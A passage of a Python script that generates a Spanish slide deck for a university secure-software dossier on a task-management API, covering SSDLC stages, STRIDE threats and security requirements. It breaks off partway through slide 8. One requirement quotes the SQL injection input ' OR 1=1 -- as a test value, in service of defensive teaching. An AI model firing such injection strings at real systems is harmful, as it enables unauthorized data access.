import os
import sys
from pptx import Presentation
from pptx.util import Inches, Pt
from pptx.dml.color import RGBColor
from pptx.enum.text import PP_ALIGN, MSO_ANCHOR
from pptx.enum.shapes import MSO_SHAPE

def create_presentation():
    prs = Presentation()
    prs.slide_width = Inches(13.333)
    prs.slide_height = Inches(7.5)
    blank_layout = prs.slide_layouts[6]

    # Paleta de colores
    C_NAVY_DARK = RGBColor(15, 23, 42)    # #0f172a
    C_BLUE_TOP   = RGBColor(30, 58, 138)   # #1e3a8a
    C_BLUE_MID   = RGBColor(37, 99, 235)   # #2563eb
    C_SKY        = RGBColor(2, 132, 199)   # #0284c7
    C_BG_LIGHT   = RGBColor(248, 250, 252) # #f8fafc
    C_WHITE      = RGBColor(255, 255, 255)
    C_TEXT_DARK  = RGBColor(30, 41, 59)    # #1e293b
    C_TEXT_MUTED = RGBColor(100, 116, 139) # #64748b
    C_RED        = RGBColor(220, 38, 38)   # #dc2626
    C_GREEN      = RGBColor(22, 163, 74)   # #16a34a
    C_AMBER      = RGBColor(217, 119, 6)   # #d97706
    C_BORDER     = RGBColor(226, 232, 240) # #e2e8f0
    C_CODE_BG    = RGBColor(9, 13, 22)     # #090d16
    C_CODE_TEXT  = RGBColor(74, 222, 128)  # #4ade80

    def add_header(slide, title_text, category_text, icon="📋"):
        # Header banner
        header = slide.shapes.add_shape(MSO_SHAPE.RECTANGLE, 0, 0, Inches(13.333), Inches(0.95))
        header.fill.solid()
        header.fill.fore_color.rgb = C_BLUE_TOP
        header.line.fill.background()

        tf = header.text_frame
        tf.word_wrap = True
        tf.vertical_anchor = MSO_ANCHOR.MIDDLE
        p = tf.paragraphs[0]
        p.alignment = PP_ALIGN.LEFT
        p.text = f"  {icon}  {title_text}"
        p.font.name = "Arial"
        p.font.size = Pt(20)
        p.font.bold = True
        p.font.color.rgb = C_WHITE

        # Badge category en la derecha
        badge = slide.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(10.2), Inches(0.2), Inches(2.7), Inches(0.55))
        badge.fill.solid()
        badge.fill.fore_color.rgb = C_BLUE_MID
        badge.line.fill.background()
        btf = badge.text_frame
        btf.vertical_anchor = MSO_ANCHOR.MIDDLE
        bp = btf.paragraphs[0]
        bp.alignment = PP_ALIGN.CENTER
        bp.text = category_text
        bp.font.name = "Arial"
        bp.font.size = Pt(11)
        bp.font.bold = True
        bp.font.color.rgb = C_WHITE

    def add_footer(slide, current_slide, total_slides=24):
        footer_bg = slide.shapes.add_shape(MSO_SHAPE.RECTANGLE, 0, Inches(7.05), Inches(13.333), Inches(0.45))
        footer_bg.fill.solid()
        footer_bg.fill.fore_color.rgb = C_WHITE
        footer_bg.line.color.rgb = C_BORDER
        footer_bg.line.width = Pt(1)

        txBox = slide.shapes.add_textbox(Inches(0.6), Inches(7.05), Inches(8), Inches(0.45))
        tf = txBox.text_frame
        p = tf.paragraphs[0]
        p.alignment = PP_ALIGN.LEFT
        p.text = "UNSAAC • Escuela Profesional de Ingeniería Informática y de Sistemas • Mini Dossier de Software Seguro"
        p.font.name = "Arial"
        p.font.size = Pt(9.5)
        p.font.color.rgb = C_TEXT_MUTED

        txBox2 = slide.shapes.add_textbox(Inches(10.5), Inches(7.05), Inches(2.2), Inches(0.45))
        tf2 = txBox2.text_frame
        p2 = tf2.paragraphs[0]
        p2.alignment = PP_ALIGN.RIGHT
        p2.text = f"Slide {current_slide} / {total_slides}"
        p2.font.name = "Arial"
        p2.font.size = Pt(9.5)
        p2.font.bold = True
        p2.font.color.rgb = C_TEXT_MUTED

    img_dir = "CAPTURAS DE PANTALLA DEL SOFTWARE"

    # ==========================================
    # SLIDE 1: PORTADA
    # ==========================================
    s1 = prs.slides.add_slide(blank_layout)
    bg1 = s1.shapes.add_shape(MSO_SHAPE.RECTANGLE, 0, 0, Inches(13.333), Inches(7.5))
    bg1.fill.solid()
    bg1.fill.fore_color.rgb = C_NAVY_DARK
    bg1.line.fill.background()

    # Barra decorativa izquierda
    decor = s1.shapes.add_shape(MSO_SHAPE.RECTANGLE, Inches(0.8), Inches(1.2), Inches(0.15), Inches(3.8))
    decor.fill.solid()
    decor.fill.fore_color.rgb = C_BLUE_MID
    decor.line.fill.background()

    t_box = s1.shapes.add_textbox(Inches(1.2), Inches(0.9), Inches(11.2), Inches(4.2))
    tf1 = t_box.text_frame
    tf1.word_wrap = True

    p = tf1.paragraphs[0]
    p.text = "UNIVERSIDAD NACIONAL DE SAN ANTONIO ABAD DEL CUSCO"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_SKY

    p = tf1.add_paragraph()
    p.text = "Escuela Profesional de Ingeniería Informática y de Sistemas • Ingeniería de Software II"
    p.font.name = "Arial"
    p.font.size = Pt(12)
    p.font.color.rgb = RGBColor(148, 163, 184)
    p.space_after = Pt(20)

    p = tf1.add_paragraph()
    p.text = "TAREA 4.1: MINI DOSSIER DE SOFTWARE SEGURO"
    p.font.name = "Arial"
    p.font.size = Pt(14)
    p.font.bold = True
    p.font.color.rgb = RGBColor(245, 158, 11)

    p = tf1.add_paragraph()
    p.text = "Gestión de Tareas API — Implementación SSDLC"
    p.font.name = "Arial"
    p.font.size = Pt(32)
    p.font.bold = True
    p.font.color.rgb = C_WHITE

    p = tf1.add_paragraph()
    p.text = "Análisis STRIDE, Requisitos Formales, Matriz P×I, Hardening Defensivo y Verificación Automatizada."
    p.font.name = "Arial"
    p.font.size = Pt(14)
    p.font.color.rgb = RGBColor(203, 213, 225)
    p.space_after = Pt(24)

    # 3 Tarjetas inferiores
    card_info = [
        ("DOCENTE RESPONSABLE", "Ing. Alex Fernando Huillca Huaman", "Ingeniería de Software II — Lab"),
        ("EQUIPO DE TRABAJO", "Equipo 02", "Semestre Académico 2026-II"),
        ("REPOSITORIO & DEMO", "github.com/GamoLG/PRACTICA-4-INGENIERIA...", "practica-4-ingenieria-de-software-ii.onrender.com")
    ]
    for i, (k, val, sub) in enumerate(card_info):
        c_left = Inches(1.2 + i * 3.8)
        c_box = s1.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, c_left, Inches(5.2), Inches(3.5), Inches(1.5))
        c_box.fill.solid()
        c_box.fill.fore_color.rgb = RGBColor(30, 41, 59)
        c_box.line.color.rgb = RGBColor(51, 65, 85)
        ctf = c_box.text_frame
        ctf.word_wrap = True
        
        cp1 = ctf.paragraphs[0]
        cp1.text = k
        cp1.font.name = "Arial"
        cp1.font.size = Pt(9.5)
        cp1.font.bold = True
        cp1.font.color.rgb = C_SKY
        
        cp2 = ctf.add_paragraph()
        cp2.text = val
        cp2.font.name = "Arial"
        cp2.font.size = Pt(11)
        cp2.font.bold = True
        cp2.font.color.rgb = C_WHITE
        
        cp3 = ctf.add_paragraph()
        cp3.text = sub
        cp3.font.name = "Arial"
        cp3.font.size = Pt(9)
        cp3.font.color.rgb = RGBColor(148, 163, 184)

    add_footer(s1, 1)

    # ==========================================
    # SLIDE 2: ÍNDICE GENERAL
    # ==========================================
    s2 = prs.slides.add_slide(blank_layout)
    add_header(s2, "Estructura del Mini Dossier de Software Seguro", "Tabla de Contenidos", "📑")
    
    sections = [
        ("01", "Mapa SSDLC", "Las 6 etapas completas del ciclo de vida de desarrollo seguro, amenazas STRIDE y controles.", "Slides 3 — 6", C_BLUE_MID),
        ("02", "Requisitos de Seguridad", "5 requisitos verificables formales (RS-01 a RS-05) con CWE, prioridad y aceptación.", "Slides 7 — 8", C_SKY),
        ("03", "Matriz de Riesgos", "Evaluación cuantitativa P×I, mapa de calor, niveles de severidad y responsables.", "Slides 9 — 10", C_AMBER),
        ("04", "Código Seguro", "Comparativas Antes vs. Después (SQLi, IDOR, XSS) y suite de 19 pruebas negativas.", "Slides 11 — 14", C_GREEN),
        ("05", "Evidencias & Logros", "21 capturas reales del software en producción, métricas cuantitativas y reflexión.", "Slides 15 — 24", RGBColor(124, 58, 237))
    ]

    for i, (num, title, desc, sl_ref, col) in enumerate(sections):
        left_pos = Inches(0.8 + i * 2.4)
        c = s2.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, left_pos, Inches(1.8), Inches(2.2), Inches(4.8))
        c.fill.solid()
        c.fill.fore_color.rgb = C_WHITE
        c.line.color.rgb = col
        c.line.width = Pt(2.5)

        ctf = c.text_frame
        ctf.word_wrap = True
        
        p = ctf.paragraphs[0]
        p.alignment = PP_ALIGN.CENTER
        p.text = num
        p.font.name = "Arial"
        p.font.size = Pt(28)
        p.font.bold = True
        p.font.color.rgb = col
        p.space_after = Pt(10)

        p = ctf.add_paragraph()
        p.alignment = PP_ALIGN.CENTER
        p.text = title
        p.font.name = "Arial"
        p.font.size = Pt(13)
        p.font.bold = True
        p.font.color.rgb = C_TEXT_DARK
        p.space_after = Pt(10)

        p = ctf.add_paragraph()
        p.alignment = PP_ALIGN.LEFT
        p.text = desc
        p.font.name = "Arial"
        p.font.size = Pt(10)
        p.font.color.rgb = C_TEXT_MUTED
        p.space_after = Pt(20)

        p = ctf.add_paragraph()
        p.alignment = PP_ALIGN.CENTER
        p.text = sl_ref
        p.font.name = "Arial"
        p.font.size = Pt(11)
        p.font.bold = True
        p.font.color.rgb = col

    add_footer(s2, 2)

    # ==========================================
    # SLIDE 3: SSDLC VISIÓN GENERAL
    # ==========================================
    s3 = prs.slides.add_slide(blank_layout)
    add_header(s3, "1. Mapa SSDLC — Visión Panorámica de las 6 Etapas", "Metodología Shift-Left", "🔄")

    # Texto intro
    intro_box = s3.shapes.add_textbox(Inches(0.8), Inches(1.1), Inches(11.733), Inches(0.8))
    itf = intro_box.text_frame
    itf.word_wrap = True
    p = itf.paragraphs[0]
    p.text = "Implementación formal del Ciclo de Vida de Desarrollo de Software Seguro (SSDLC). La seguridad se incorpora desde la definición inicial de requisitos para prevenir vulnerabilidades arquitectónicas costosas de corregir en producción."
    p.font.name = "Arial"
    p.font.size = Pt(12)
    p.font.color.rgb = C_TEXT_DARK

    stages_6 = [
        ("1", "Requisitos", "Definición", "DTOs estrictos en Pydantic con extra='forbid' y 5 requisitos formales.", C_BLUE_MID),
        ("2", "Diseño", "Modelado", "STRIDE, Trust Boundaries, matriz RBAC y arquitectura 3 capas.", C_BLUE_TOP),
        ("3", "Codificación", "Hardening", "Prepared Statements, Anti-IDOR, bcrypt(12) y Rate Limiting.", C_SKY),
        ("4", "Pruebas", "Verificación", "SAST (Bandit/Pylint) y 19 pruebas de penetración automatizadas (pytest).", RGBColor(124, 58, 237)),
        ("5", "Despliegue", "Producción", "TLS/HTTPS forzado, CORS restrictivo y cabeceras de seguridad activas.", C_AMBER),
        ("6", "Operación", "Monitoreo", "Trazabilidad en audit.log sin credenciales y revocación token_version.", C_GREEN)
    ]

    for i, (num, name, badge_t, desc, col) in enumerate(stages_6):
        left_pos = Inches(0.8 + i * 1.95)
        c = s3.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, left_pos, Inches(2.1), Inches(1.85), Inches(4.5))
        c.fill.solid()
        c.fill.fore_color.rgb = C_WHITE
        c.line.color.rgb = col
        c.line.width = Pt(2)

        ctf = c.text_frame
        ctf.word_wrap = True

        p = ctf.paragraphs[0]
        p.alignment = PP_ALIGN.CENTER
        p.text = num
        p.font.name = "Arial"
        p.font.size = Pt(26)
        p.font.bold = True
        p.font.color.rgb = col

        p = ctf.add_paragraph()
        p.alignment = PP_ALIGN.CENTER
        p.text = name
        p.font.name = "Arial"
        p.font.size = Pt(12.5)
        p.font.bold = True
        p.font.color.rgb = C_TEXT_DARK

        p = ctf.add_paragraph()
        p.alignment = PP_ALIGN.CENTER
        p.text = f"[{badge_t}]"
        p.font.name = "Arial"
        p.font.size = Pt(9.5)
        p.font.bold = True
        p.font.color.rgb = col
        p.space_after = Pt(12)

        p = ctf.add_paragraph()
        p.alignment = PP_ALIGN.LEFT
        p.text = desc
        p.font.name = "Arial"
        p.font.size = Pt(10)
        p.font.color.rgb = C_TEXT_MUTED

    add_footer(s3, 3)

    # ==========================================
    # SLIDE 4: SSDLC ETAPAS 1 Y 2
    # ==========================================
    s4 = prs.slides.add_slide(blank_layout)
    add_header(s4, "1. Mapa SSDLC — Etapas 1 (Requisitos) y 2 (Diseño Seguro)", "Fases Iniciales", "📋")

    e1_box = s4.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.3), Inches(5.6), Inches(5.4))
    e1_box.fill.solid()
    e1_box.fill.fore_color.rgb = C_WHITE
    e1_box.line.color.rgb = C_BLUE_MID
    e1_box.line.width = Pt(2)
    tf = e1_box.text_frame
    tf.word_wrap = True

    p = tf.paragraphs[0]
    p.text = "ETAPA 1: REQUISITOS DE SEGURIDAD"
    p.font.name = "Arial"
    p.font.size = Pt(15)
    p.font.bold = True
    p.font.color.rgb = C_BLUE_MID
    p.space_after = Pt(8)

    p = tf.add_paragraph()
    p.text = "⚠️ AMENAZAS IDENTIFICADAS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_RED

    bullets_e1_bad = [
        "Requisitos incompletos que originan endpoints críticos sin validación.",
        "Ausencia de un modelo formal de Control de Acceso (RBAC).",
        "Omisión de reglas estrictas sobre tipo, tamaño y formato de entradas."
    ]
    for b in bullets_e1_bad:
        p = tf.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK
    p.space_after = Pt(14)

    p = tf.add_paragraph()
    p.text = "🛡️ CONTROLES IMPLEMENTADOS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    bullets_e1_good = [
        "Definición de DTOs en Pydantic configurados con extra='forbid' (anti-Mass Assignment).",
        "Formalización de 5 requisitos funcionales de seguridad verificables (RS-01 al RS-05).",
        "Matriz RBAC estructurada con roles de Administrador, Docente y Estudiante."
    ]
    for b in bullets_e1_good:
        p = tf.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK

    e2_box = s4.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.9), Inches(1.3), Inches(5.6), Inches(5.4))
    e2_box.fill.solid()
    e2_box.fill.fore_color.rgb = C_WHITE
    e2_box.line.color.rgb = C_BLUE_TOP
    e2_box.line.width = Pt(2)
    tf2 = e2_box.text_frame
    tf2.word_wrap = True

    p = tf2.paragraphs[0]
    p.text = "ETAPA 2: DISEÑO SEGURO DE ARQUITECTURA"
    p.font.name = "Arial"
    p.font.size = Pt(15)
    p.font.bold = True
    p.font.color.rgb = C_BLUE_TOP
    p.space_after = Pt(8)

    p = tf2.add_paragraph()
    p.text = "⚠️ AMENAZAS IDENTIFICADAS (STRIDE):"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_RED

    bullets_e2_bad = [
        "Spoofing: Suplantación de identidad mediante reutilización indebida de JWT.",
        "Elevation of Privilege: Acceso no autorizado a tareas de otros usuarios (IDOR).",
        "Tampering: Modificación maliciosa de información en tránsito o reposo."
    ]
    for b in bullets_e2_bad:
        p = tf2.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK
    p.space_after = Pt(14)

    p = tf2.add_paragraph()
    p.text = "🛡️ CONTROLES IMPLEMENTADOS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    bullets_e2_good = [
        "JWT firmados con HS256, identificador jti (UUIDv4) y versión de sesión token_version.",
        "Delimitación formal de Trust Boundaries entre cliente, API FastAPI y base SQLite.",
        "Arquitectura desacoplada en 3 capas con validación de autorización previa al acceso a datos."
    ]
    for b in bullets_e2_good:
        p = tf2.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK

    add_footer(s4, 4)

    # ==========================================
    # SLIDE 5: SSDLC ETAPAS 3 Y 4
    # ==========================================
    s5 = prs.slides.add_slide(blank_layout)
    add_header(s5, "1. Mapa SSDLC — Etapas 3 (Codificación) y 4 (Pruebas)", "Construcción Defensiva", "💻")

    e3_box = s5.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.3), Inches(5.6), Inches(5.4))
    e3_box.fill.solid()
    e3_box.fill.fore_color.rgb = C_WHITE
    e3_box.line.color.rgb = C_SKY
    e3_box.line.width = Pt(2)
    tf = e3_box.text_frame
    tf.word_wrap = True

    p = tf.paragraphs[0]
    p.text = "ETAPA 3: CODIFICACIÓN SEGURA"
    p.font.name = "Arial"
    p.font.size = Pt(15)
    p.font.bold = True
    p.font.color.rgb = C_SKY
    p.space_after = Pt(8)

    p = tf.add_paragraph()
    p.text = "⚠️ AMENAZAS IDENTIFICADAS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_RED

    bullets_e3_bad = [
        "Inyección SQL por concatenación o interpolación en strings (CWE-89).",
        "IDOR / Broken Access Control al omitir la verificación del usuario propietario (CWE-284).",
        "Fuerza bruta masiva en login por falta de control de peticiones (CWE-307)."
    ]
    for b in bullets_e3_bad:
        p = tf.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK
    p.space_after = Pt(14)

    p = tf.add_paragraph()
    p.text = "🛡️ CONTROLES IMPLEMENTADOS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    bullets_e3_good = [
        "Consultas 100% parametrizadas (Prepared Statements con placeholders ?).",
        "Validación de pertenencia obligatoria (owner_id == session.user_id o HTTP 403).",
        "Hashing robusto con bcrypt (factor de costo 12) y Rate Limiting progresivo (30s/180s)."
    ]
    for b in bullets_e3_good:
        p = tf.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK

    e4_box = s5.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.9), Inches(1.3), Inches(5.6), Inches(5.4))
    e4_box.fill.solid()
    e4_box.fill.fore_color.rgb = C_WHITE
    e4_box.line.color.rgb = RGBColor(124, 58, 237)
    e4_box.line.width = Pt(2)
    tf2 = e4_box.text_frame
    tf2.word_wrap = True

    p = tf2.paragraphs[0]
    p.text = "ETAPA 4: PRUEBAS DE SEGURIDAD"
    p.font.name = "Arial"
    p.font.size = Pt(15)
    p.font.bold = True
    p.font.color.rgb = RGBColor(124, 58, 237)
    p.space_after = Pt(8)

    p = tf2.add_paragraph()
    p.text = "⚠️ AMENAZAS IDENTIFICADAS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_RED

    bullets_e4_bad = [
        "Código vulnerable o mala práctica no detectada antes de producción.",
        "Regresiones de seguridad introducidas en cambios posteriores de código.",
        "Falsos negativos originados por pruebas que solo verifican el happy path."
    ]
    for b in bullets_e4_bad:
        p = tf2.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK
    p.space_after = Pt(14)

    p = tf2.add_paragraph()
    p.text = "🛡️ CONTROLES IMPLEMENTADOS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    bullets_e4_good = [
        "Análisis estático SAST automatizado con Bandit y Pylint (0 alertas en app_segura).",
        "Suite de 19 pruebas de penetración automatizadas con Pytest (100% exitosas).",
        "Pruebas negativas con inyección de payloads maliciosos de SQLi, XSS y fuerza bruta."
    ]
    for b in bullets_e4_good:
        p = tf2.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK

    add_footer(s5, 5)

    # ==========================================
    # SLIDE 6: SSDLC ETAPAS 5 Y 6
    # ==========================================
    s6 = prs.slides.add_slide(blank_layout)
    add_header(s6, "1. Mapa SSDLC — Etapas 5 (Despliegue) y 6 (Operación)", "Fases de Producción", "🚀")

    e5_box = s6.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.3), Inches(5.6), Inches(5.4))
    e5_box.fill.solid()
    e5_box.fill.fore_color.rgb = C_WHITE
    e5_box.line.color.rgb = C_AMBER
    e5_box.line.width = Pt(2)
    tf = e5_box.text_frame
    tf.word_wrap = True

    p = tf.paragraphs[0]
    p.text = "ETAPA 5: DESPLIEGUE SEGURO"
    p.font.name = "Arial"
    p.font.size = Pt(15)
    p.font.bold = True
    p.font.color.rgb = C_AMBER
    p.space_after = Pt(8)

    p = tf.add_paragraph()
    p.text = "⚠️ AMENAZAS IDENTIFICADAS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_RED

    bullets_e5_bad = [
        "Interceptación de credenciales por ataques Man-in-the-Middle (MitM) en HTTP plano.",
        "Cross-Origin Request Forgery por configuración laxa de CORS (*).",
        "Ausencia de cabeceras de protección en navegador (Clickjacking, MIME sniffing)."
    ]
    for b in bullets_e5_bad:
        p = tf.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK
    p.space_after = Pt(14)

    p = tf.add_paragraph()
    p.text = "🛡️ CONTROLES IMPLEMENTADOS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    bullets_e5_good = [
        "Cifrado en tránsito TLS/HTTPS forzado de extremo a extremo mediante plataforma Render.",
        "Middleware de Cabeceras de Seguridad: X-Frame-Options: DENY, HSTS y CSP estricto.",
        "Política CORS restrictiva basada en regex que rechaza orígenes no autenticados."
    ]
    for b in bullets_e5_good:
        p = tf.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK

    e6_box = s6.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.9), Inches(1.3), Inches(5.6), Inches(5.4))
    e6_box.fill.solid()
    e6_box.fill.fore_color.rgb = C_WHITE
    e6_box.line.color.rgb = C_GREEN
    e6_box.line.width = Pt(2)
    tf2 = e6_box.text_frame
    tf2.word_wrap = True

    p = tf2.paragraphs[0]
    p.text = "ETAPA 6: OPERACIÓN Y MONITOREO"
    p.font.name = "Arial"
    p.font.size = Pt(15)
    p.font.bold = True
    p.font.color.rgb = C_GREEN
    p.space_after = Pt(8)

    p = tf2.add_paragraph()
    p.text = "⚠️ AMENAZAS IDENTIFICADAS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_RED

    bullets_e6_bad = [
        "Incidentes de intrusión silenciosos sin registro forense ni trazabilidad.",
        "Sesiones comprometidas que continúan activas tras actualizar la contraseña.",
        "Exposición o fuga de credenciales dentro de los archivos de log del servidor."
    ]
    for b in bullets_e6_bad:
        p = tf2.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK
    p.space_after = Pt(14)

    p = tf2.add_paragraph()
    p.text = "🛡️ CONTROLES IMPLEMENTADOS:"
    p.font.name = "Arial"
    p.font.size = Pt(11)
    p.font.bold = True
    p.font.color.rgb = C_GREEN

    bullets_e6_good = [
        "Bitácora audit.log estructurada que audita eventos omitiendo contraseñas sensibles.",
        "Mecanismo token_version: revoca automáticamente todas las sesiones previas.",
        "Endpoint de logout con revocación en servidor y monitoreo de IPs sospechosas."
    ]
    for b in bullets_e6_good:
        p = tf2.add_paragraph()
        p.text = f"• {b}"
        p.font.name = "Arial"
        p.font.size = Pt(10.5)
        p.font.color.rgb = C_TEXT_DARK

    add_footer(s6, 6)

    # ==========================================
    # SLIDE 7: REQUISITOS RS-01 AL RS-03
    # ==========================================
    s7 = prs.slides.add_slide(blank_layout)
    add_header(s7, "2. Requisitos de Seguridad Verificables (RS-01 al RS-03)", "Trazabilidad Formal", "🔒")

    rows = 4
    cols = 6
    tbl_shape = s7.shapes.add_table(rows, cols, Inches(0.8), Inches(1.3), Inches(11.733), Inches(5.3))
    tbl = tbl_shape.table

    col_widths = [Inches(1.0), Inches(3.2), Inches(2.2), Inches(1.1), Inches(1.4), Inches(2.833)]
    for idx, w in enumerate(col_widths):
        tbl.columns[idx].width = w

    headers_rs = ["ID", "REQUISITO DE SEGURIDAD", "AMENAZA ASOCIADA", "CWE", "PRIORIDAD", "CRITERIO & ACEPTACIÓN"]
    for c_idx, h in enumerate(headers_rs):
        cell = tbl.cell(0, c_idx)
        cell.fill.solid()
        cell.fill.fore_color.rgb = C_NAVY_DARK
        p = cell.text_frame.paragraphs[0]
        p.text = h
        p.font.name = "Arial"
        p.font.size = Pt(10)
        p.font.bold = True
        p.font.color.rgb = C_WHITE

    rs_data_1 = [
        ("RS-01", "Control Estricto Anti-IDOR\nEl sistema valida fehacientemente que el usuario sea el propietario antes de modificar o eliminar.", "Elevation of Privilege", "CWE-284", "CRÍTICA", "DELETE/PUT sobre recurso ajeno retorna HTTP 403 Forbidden.\nTest: test_03_idor"),
        ("RS-02", "Inmunidad contra Inyección SQL\nNinguna consulta hacia SQLite concatena o interpola strings ingresados por el usuario.", "Tampering / Data Breach", "CWE-89", "CRÍTICA", "Búsqueda con ' OR 1=1 -- es tratada como literal y retorna [].\nTest: test_17_sqli"),
        ("RS-03", "Cifrado con bcrypt (Cost 12)\nContraseñas procesadas mediante bcrypt con salt aleatorio y costo 12. Nunca en texto plano.", "Information Disclosure", "CWE-256", "CRÍTICA", "El hash en la BD inicia obligatoriamente con prefijo $2b$12$.\nTest: test_01_register")
    ]

    for r_idx, row_vals in enumerate(rs_data_1, start=1):
        for c_idx, val in enumerate(row_vals):
            cell = tbl.cell(r_idx, c_idx)
            cell.fill.solid()
            cell.fill.fore_color.rgb = C_WHITE if r_idx % 2 == 1 else C_BG_LIGHT
            p = cell.text_frame.paragraphs[0]
            p.text = val
            p.font.name = "Arial"
            p.font.size = Pt(9.5)
            p.font.color.rgb = C_TEXT_DARK
            if c_idx == 0:
                p.font.bold = True
                p.font.color.rgb = C_BLUE_MID
            elif c_idx == 3:
                p.font.bold = True
                p.font.color.rgb = C_RED
            elif c_idx == 4:
                p.font.bold = True
                p.font.color.rgb = C_RED

    add_footer(s7, 7)

    # ==========================================
    # SLIDE 8: REQUISITOS RS-04 Y RS-05
    # ==========================================
    s8 = prs.slides.add_slide(blank_layout)
    add_header(s8, "2. Requisitos de Seguridad Verificables (RS-04 y RS-05)", "Trazabilidad Formal", "🔒")

    rows = 3
    cols = 6
    tbl_shape2 = s8.shapes.add_table(rows, cols, Inches(0.8), Inches(1.3), Inches(11.733), Inches(3.6))
    tbl2 = tbl_shape2.table
    for idx, w in enumerate(col_widths):
        tbl2.columns[idx].width = w

    for c_idx, h in enumerate(headers_rs):
        cell = tbl2.cell(0, c_idx)
        cell.fill.solid()
        cell.fill.fore_color.rgb = C_NAVY_DARK
        p = cell.text_frame.paragraphs[0]
        p.text = h
        p.font.name = "Arial"
        p.font.size = Pt(10)
        p.font.bold = True
        p.font.color.rgb = C_WHITE

    rs_data_2 = [
        ("RS-04", "Rate Limiting Progresivo\nEl endpoint de login mitiga fuerza bruta bloqueando tras 3 intentos erróneos (30s y 180s acumulativos).", "DoS / Brute Force", "CWE-307", "ALTA", "El 4.º intento fallido consecutivo retorna HTTP 429 con retry-after.\nTest: test_06_brute"),
        ("RS-05", "Revocación Global por token_version\nAl cambiar contraseña se invalidan de inmediato todos los tokens JWT emitidos con anterioridad.", "Session Hijacking / Replay", "CWE-613", "ALTA", "Token previo tras actualizar clave genera HTTP 401 Unauthorized.\nTest: test_09_revoke")
    ]

    for r_idx, row_vals in enumerate(rs_data_2, start=1):
        for c_idx, val in enumerate(row_vals):
            cell = tbl2.cell(r_idx, c_idx)
            cell.fill.solid()
            cell.fill.fore_color.rgb = C_WHITE if r_idx % 2 == 1 else C_BG_LIGHT
            p = cell.text_frame.paragraphs[0]
            p.text = val
            p.font.name = "Arial"
            p.font.size = Pt(10)
            p.font.color.rgb = C_TEXT_DARK
            if c_idx == 0:
                p.font.bold = True
                p.font.color.rgb = C_BLUE_MID
            elif c_idx == 3:
                p.font.bold = True
                p.font.color.rgb = C_AMBER
            elif c_idx == 4:
                p.font.bold = True
                p.font.color.rgb = C_AMBER

    # 3 Tarjetas inferiores de valor
    defense_cards = [
        ("🎯 VERIFICABILIDAD TOTAL", "Todos los requisitos poseen un test automatizado en pytest con aserciones estrictas de código HTTP y payload."),
        ("🛡️ DEFENSA EN PROFUNDIDAD", "Los controles abarcan capas de red (TLS), middleware (Rate Limit, Headers), lógica (Ownership) y base de datos."),
        ("📋 CUMPLIMIENTO OWASP", "Cubre directamente los riesgos A01 (Broken Access Control), A02 (Cryptographic Failures) y A03 (Injection) del OWASP Top 10.")
    ]
    for i, (tit, txt) in enumerate(defense_cards):
        left_pos = Inches(0.8 + i * 3.95)
        c = s8.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, left_pos, Inches(5.1), Inches(3.8), Inches(1.6))
        c.fill.solid()
        c.fill.fore_color.rgb = C_WHITE
        c.line.color.rgb = C_BLUE_MID
        c.line.width = Pt(1.5)
        ctf = c.text_frame
        ctf.word_wrap = True
        
        p = ctf.paragraphs[0]
        p.text = tit
